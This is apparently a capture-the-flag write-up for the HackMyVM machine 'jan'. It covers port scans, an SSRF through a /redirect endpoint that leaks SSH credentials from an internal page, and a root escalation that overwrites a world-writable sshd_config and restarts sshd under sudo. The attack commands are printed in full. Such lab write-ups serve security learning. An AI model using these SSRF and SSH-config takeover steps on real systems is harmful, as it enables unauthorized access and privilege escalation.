@@ -1,0 +1,212 @@
+So today we have another Machine To solve from HackMyVM which is none other than but jan.
+
+
+So we as usual we got the IP in banner of machine when it boots.
+
+So Main IP :: 192.168.56.113
+
+After running full-port scan we find that only two ports are open yet.
+
+Nmap scan report for 192.168.56.113
+Host is up (0.00067s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Running version and service scan now.
+
+Nmap scan report for 192.168.56.113
+Host is up, received reset ttl 255 (0.00084s latency).
+Scanned at 2026-05-18 20:31:39 +1245 for 27s
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey: 
+|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHsZR0525oJX6FinfDet0UiRBNem8JeMieLtK4aTPA8IitARqNlpxoImW5Hx1zmUOmcmQLguU32H+4Ki5FNWka8=
+|   256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXdRCAzp4NQHOaCdp16oiQXHBfsVax3i+vY2La6CoBA
+8080/tcp open  http    syn-ack ttl 64 Golang net/http server
+|_http-open-proxy: Proxy might be redirecting requests
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Mon, 18 May 2026 07:46:44 GMT
+|     Content-Length: 45
+|     Content-Type: text/plain; charset=utf-8
+|     Welcome to our Public Server. Maybe Internal.
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   OfficeScan: 
+|     HTTP/1.1 400 Bad Request: missing required Host header
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|_    Request: missing required Host header
+|_http-favicon: Unknown favicon MD5: E58BCC73ED281AC1BBC18405DE40325C
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.98%I=7%D=5/18%Time=6A0AC3E5%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2018\x20May\x2020
+SF:26\x2007:46:44\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Serve
+SF:r\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK\r
+SF:\nDate:\x20Mon,\x2018\x20May\x202026\x2007:46:44\x20GMT\r\nContent-Leng
+SF:th:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelco
+SF:me\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSPRe
+SF:quest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
+SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
+SF:uest")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\
+SF:x2018\x20May\x202026\x2007:46:44\x20GMT\r\nContent-Length:\x2045\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\
+SF:x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-
+SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20R
+SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
+SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x204
+SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
+SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20h
+SF:eader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x2
+SF:0header");
+
+
+─# dirsearch -u http://192.168.56.113:8080/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/kali/hackmyvm/jan/reports/http_192.168.56.113_8080/__26-05-18_20-56-43.txt
+
+Target: http://192.168.56.113:8080/
+
+[20:56:43] Starting: 
+[20:56:43] 301 -   57B  - /%2e%2e//google.com  ->  /%252E%252E/google.com   
+[20:56:55] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp     
+[20:56:55] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
+[20:56:55] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
+[20:56:57] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
+[20:57:01] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
+[20:57:01] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
+[20:57:01] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
+[20:57:03] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
+[20:57:14] 400 -   24B  - /redirect                                         
+[20:57:15] 200 -   16B  - /robots.txt                                       
+                                                                             
+Task Completed
+
+The /credz endpoint indicates it's only accessible internally, suggesting the need for SSRF to bypass access controls.
+
+Using the /redirect endpoint with a url parameter, we can perform SSRF to access the internal /credz endpoint:
+
+http://192.168.56.113:8080/redirect?url&url=/credz -> ssh/EazyLOL
+
+so doing this makes me abit confusing then tried for direct ssh login and we will be in.
+
+jan:~$ ls
+user.txt
+jan:~$ cat user.txt 
+HMVSSWYMCNFIBDAFMTHFK
+jan:~$ 
+
+We made it and we have user.txt
+
+
+Now this is the time for Priviledge Escalation 
+
+jan:~$ sudo -l
+Matching Defaults entries for ssh on jan:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for ssh:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User ssh may run the following commands on jan:
+    (root) NOPASSWD: /sbin/service sshd restart
+
+jan:~$ ls -lah /etc/ssh/sshd_config
+-rw-rw-rw-    1 root     root        3.3K Jan 28  2025 /etc/ssh/sshd_config
+
+
+So moving with this.
+
+
+SSH Configuration Exploitation
+The privilege escalation strategy involves:
+
+Creating an SSH key pair
+Modifying the SSH configuration to allow root login with our key
+Restarting the SSH service
+Connecting as root using our private key
+
+
+jan:~$ ssh-keygen -t rsa -N "" -f /tmp/id_rsa
+Generating public/private rsa key pair.
+Your identification has been saved in /tmp/id_rsa
+Your public key has been saved in /tmp/id_rsa.pub
+The key fingerprint is:
+SHA256:5Fo3AXu6PjeqtQN8hvewUlui94puefvtQ72o3mp6fMA ssh@jan
+The key's randomart image is:
++---[RSA 3072]----+
+|        .        |
+|         o       |
+|        o o      |
+|       o o .     |
+|     . .S.o  .   |
+|      +oBoE.. .  |
+|      .OoO o . . |
+|      =+B.Bo+ .  |
+|     o+=B#**+.   |
++----[SHA256]-----+
+jan:~$ echo "PermitRootLogin yes" > /etc/ssh/sshd_config
+jan:~$ echo "StrictModes no" >> /etc/ssh/sshd_config
+jan:~$ echo "AuthorizedKeysFile /tmp/id_rsa.pub" >> /etc/ssh/sshd_config
+jan:~$ cat /etc/ssh/sshd_config
+PermitRootLogin yes
+StrictModes no
+AuthorizedKeysFile /tmp/id_rsa.pub
+jan:~$ sudo /sbin/service sshd restart
+
+ssh -F /dev/null -i /tmp/id_rsa root@localhost
+
+ ssh -F /dev/null -i /tmp/id_rsa root@localhost
+The authenticity of host 'localhost (::1)' can't be established.
+ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+jan:~#  whoami
+root
+cat /root/root.txt 
+HMV2PRMTERWTFUDNGMBG
+jan:~# 
+
+
